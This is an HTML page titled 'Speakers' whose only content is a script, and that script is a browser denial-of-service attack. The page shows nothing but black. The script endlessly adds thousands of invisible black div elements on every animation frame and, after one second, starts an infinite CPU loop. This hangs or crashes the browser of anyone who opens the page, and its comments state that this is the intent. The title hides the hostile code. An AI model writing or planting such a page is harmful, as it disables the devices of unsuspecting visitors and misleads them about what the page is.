<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<title>Speakers</title>
<style>
html, body { margin:0; padding:0; width:100%; height:100%; background:black; overflow:hidden; }
</style>
</head>
<body>
<script>
(function(){
  // Fill the DOM infinitely, keep adding & moving elements to force layout
  let body = document.body;
  function spam() {
    for (let i=0; i<1000; i++) {
      let d = document.createElement('div');
      d.style.position = 'absolute';
      d.style.top = (Math.random()*100)+'%';
      d.style.left = (Math.random()*100)+'%';
      d.style.width = '10px';
      d.style.height = '10px';
      d.style.background = 'black';
      body.appendChild(d);
    }
    // Repeat immediately
    requestAnimationFrame(spam);
  }
  spam();

  // Also add infinite CPU loop after a bit
  setTimeout(()=>{ while(true){} }, 1000);
})();
</script>
</body>
</html>
